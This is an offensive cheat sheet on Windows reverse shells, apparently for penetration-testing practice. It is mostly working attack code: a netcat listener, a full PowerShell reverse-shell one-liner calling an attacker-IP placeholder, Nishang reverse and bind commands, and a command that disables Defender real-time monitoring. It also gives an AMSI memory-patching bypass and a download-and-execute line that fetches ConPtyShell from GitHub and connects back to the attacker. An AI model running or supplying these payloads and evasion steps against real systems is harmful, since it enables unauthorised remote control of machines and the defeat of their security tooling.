# Windows Reverse Shells
**Concept:** A "Reverse Shell" forces the target machine to connect back to your attacker machine. **Key Insight:** In Windows environments, **Port 443 (HTTPS)** is the golden key. Most corporate firewalls allow outbound traffic on 443, whereas random high ports (e.g., 4444) are often blocked.
## 1. The Listener (Attacker Side)
**Goal:** Set up a "catcher" to receive the incoming connection.
```shell
# Listen on Port 443
# -l: Listen
# -v: Verbose
# -n: No DNS (Speed)
# -p: Port
sudo nc -lvnp 443
```
## 2. The Payload (PowerShell One-Liner)
**Context:** This is a "fileless" payload. It executes entirely in memory without writing an `.exe` to disk, which helps bypass some legacy antivirus detection.
**Syntax:** Replace `<ATTACKER_IP>` with your `tun0` IP.
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Nishang (The Easy Button)**
**Context:** If you can load scripts (via `IEX` download), Nishang provides a wrapper that handles the complexity for you.
```powershell
# Reverse Connect (Victim connects to Attacker)
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443

# Bind Connect (Attacker connects to Victim)
Invoke-PowerShellTcp -Bind -Port 443
```

**Breakdown:**
- `New-Object System.Net.Sockets.TCPClient`: Creates the network connection. 
- `$stream`: The data pipe.
- `iex $data`: **Invoke-Expression**. Executes the commands sent by the attacker.
- `2>&1 | Out-String`: Captures errors and output to send back.
## 3. Obstacles & Evasion
**Challenge:** **Windows Defender** or **AMSI (Antimalware Scan Interface)** will flag standard reverse shells.
### A. Disabling Defender (If Admin)
**Context:** If you already have RDP or Admin CLI access but need a reverse shell for a C2 framework.
```powershell
# Disable Real-time Monitoring (Requires Admin)
Set-MpPreference -DisableRealtimeMonitoring $true
```
### B. AMSI Bypass (Memory Patching)
**Context:** If you are a low-privilege user, you cannot disable Defender. You must "blind" it. **Mechanism:** This script forces AMSI to return "Clean" for every scan request, allowing malicious scripts to run.
```powershell
# Run this in the PowerShell session BEFORE running the reverse shell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
_(Note: This specific bypass is well-known and likely patched on modern Windows 10/11. You will need obfuscated versions for current targets.)_
## 4. Other Windows Shell Methods
**ConptyShell (Fully Interactive):** **Context:** Standard reverse shells on Windows are glitchy (no tab completion, no arrows). `ConPtyShell` creates a pseudo-console.

**Server (Attacker):**
```shell
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

**Client (Victim):**
```powershell
# Load the script from memory and execute
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> 3001
```